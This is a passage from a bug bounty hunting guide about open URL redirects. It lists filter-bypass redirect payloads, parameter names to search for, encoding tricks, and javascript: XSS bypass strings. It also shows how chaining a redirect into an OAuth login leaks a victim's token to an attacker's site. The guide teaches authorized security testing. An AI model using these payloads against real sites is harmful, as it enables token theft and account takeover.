# open-url-redirection-payloads

Open url redirects
My favorite bug to find because I usually have a 100% success rate of using a
“harmless” redirect in a chain if the target has some type of Oauth flow which
handles a token along with a redirect. Open URL redirects are simply urls such as
https://www.google.com/redirect?goto=https://www.bing.com/ which when visited will
redirect to the URL provided in the parameter. A lot of developers fail to create any
type of filtering/restriction on these so they are very very easy to find. However with
that said, filters sometimes can exist to stop you in your tracks. Below are some of
my payloads I use to bypass filters but more importantly used to determine how their
filter is working.
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
ZSeanos Methodology - https://www.bugbountyhunter.com/ Page 23
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
Some common words I dork for on google to find vulnerable endpoints: (don't forget
to test for upper & lower case!)
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url,
history, goback, redirectTo, redirectUrl, redirUrl
Now let's take advantage of our findings. If you aren't familiar with how an Oauth
login flow works I recommend checking out
https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2.
Typically the login page will look like this:
https://www.target.com/login?client_id=123&redirect_url=/sosecure and usually the
redirect_url will be whitelisted to only allow for *.target.com/*. Spot the mistake?
Armed with an open url redirect on their website you can leak the token because as
the redirect occurs the token is smuggled with the request.
The user is sent to
https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redi
rect?redirect=1&url=https://www.zseano.com/ and upon logging in will be redirected
ZSeanos Methodology - https://www.bugbountyhunter.com/ Page 24
to the attackers website along with their token used for authentication. Account
takeover report incoming!
One common problem people run into is not encoding the values correctly,
especially if the target only allows for /localRedirects. Your payload would look like
something like /redirect?goto=https://zseano.com/, but when using this as it is the
?goto= parameter may get dropped in redirects (depending on how the web
application works and how many redirects occur!). This also may be the case if it
contains multiple parameters (via &) and the redirect parameter may be missed. I will
always encode certain values such as & ? # / \ to force the browser to decode it
after the first redirect.
Location: /redirect%3Fgoto=https://www.zseano.com/%253Fexample=hax
Which then redirects, and the browser kindly then decodes %3F in the BROWSER
URL to ?, and our parameters were successfully sent through. We end up with:
https://www.example.com/redirect?goto=https://www.zseano.com/%3Fexample=hax,
which then when it redirects again will allow the ?example parameter to also be sent.
You can read an interesting finding on this further below.
Sometimes you will need to double encode them based on how many redirects are
made & parameters.
https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http
s%3A%2F%2Fwww.google.com%2F
https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=
1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F
When hunting for open url redirects also bear in mind that they can be used for
chaining an SSRF vulnerability which is explained more below.
If the redirect you discover is via the “Location:” header then XSS will not be
possible, however if it redirected via something like “window.location” then you
ZSeanos Methodology - https://www.bugbountyhunter.com/ Page 25
should test for “javascript:” instead of redirecting to your website as XSS will be
possible here. Some common ways to bypass filters:
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`
